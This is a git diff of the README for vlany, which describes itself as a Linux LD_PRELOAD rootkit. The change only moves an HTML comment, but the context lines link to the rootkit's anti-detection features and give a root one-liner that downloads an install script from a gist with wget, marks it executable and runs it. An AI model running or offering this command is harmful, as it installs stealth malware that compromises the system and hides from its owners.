@@ -2,7 +2,6 @@
 ####*vlany is a Linux LD_PRELOAD rootkit*.</br>
  * *[List of features](https://github.com/mempodippy/vlany/wiki/Features)*</br>
  * *[Anti-Detection](https://github.com/mempodippy/vlany/wiki/Anti-Detection)*</br>
-<!-- LAPTOPS CANNOT RUN, THEY ARE LAPTOPS --></br>
 ##Installing
  * vlany's [quick_install.sh](https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh) script is the fastest/easiest method of installation.</br>
 `root@vlany:~# wget https://gist.githubusercontent.com/mempodippy/d93fd99164bace9e63752afb791a896b/raw/6b06d235beac8590f56c47b7f46e2e4fac9cf584/quick_install.sh -O /tmp/quick_install.sh && chmod +x /tmp/quick_install.sh && /tmp/quick_install.sh`</br></br>
@@ -51,3 +50,6 @@ No minor bugs present as of now. Please use the [issues page](https://github.com
 
 ##[In-depth README.txt](https://raw.githubusercontent.com/mempodippy/vlany/master/README) (very detailed but not maintained)</br>
 **NOTE:** vlany is in active development. Changes are constantly being made to this repository, so beware that vlany is very experimental.
+
+
+<!-- LAPTOPS CANNOT RUN, THEY ARE LAPTOPS --> 
